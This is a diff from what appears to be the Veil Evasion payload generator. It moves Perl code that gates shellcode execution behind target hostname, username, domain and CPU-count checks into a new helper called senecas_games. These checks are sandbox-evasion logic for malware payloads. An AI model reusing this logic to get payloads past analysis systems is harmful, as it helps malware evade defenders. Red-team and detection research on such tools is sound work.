@@ -8,6 +8,7 @@ Updated by @ChrisTruncer
 """
 
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 from Tools.Evasion.evasion_common import shellcode_help
 
 
@@ -64,43 +65,8 @@ class PayloadModule:
         else:
             Shellcode = self.cli_shellcode
 
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            rand_hostname = evasion_helpers.randomString()
-            payload_code += '\t' * num_ends_required + 'Use Sys::Hostname;\n'
-            payload_code += '\t' * num_ends_required + 'my $' + rand_hostname + ' = hostname;\n'
-            payload_code += '\t' * num_ends_required + 'if (index(lc($' + rand_hostname + '), lc(' + self.required_options["HOSTNAME"][0] + ')) != -1){\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            rand_name = evasion_helpers.randomString()
-            payload_code += '\t' * num_ends_required + 'my $' + rand_name + ' = Win32::LoginName;\n'
-            payload_code += '\t' * num_ends_required + 'if (index(lc($' + rand_name + '), lc(\"' + self.required_options["USERNAME"][0] + '\")) != -1){\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            rand_domain = evasion_helpers.randomString()
-            payload_code += '\t' * num_ends_required + 'use Net::Domain qw (hostdomain);\n'
-            payload_code += '\t' * num_ends_required + 'my $' + rand_domain + ' = hostdomain();\n'
-            payload_code += '\t' * num_ends_required + 'if (index(lc($' + rand_domain + '), lc(\"' + self.required_options["DOMAIN"][0] + '\")) != -1){\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-
-            rand_corecount = evasion_helpers.randomString()
-            payload_code += '\t' * num_ends_required + 'my $' + rand_corecount + ' = $ENV{\"NUMBER_OF_PROCESSORS\"};'
-            payload_code += '\t' * num_ends_required + 'if ($' + rand_corecount + ' >=  '+ self.required_options["PROCESSORS"][0] + '){\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
+        payload_code2, num_ends_required = gamemaker.senecas_games(self)
+        payload_code = payload_code + payload_code2
 
         # randomly generate variable names
         shellcode_variable = evasion_helpers.randomString()
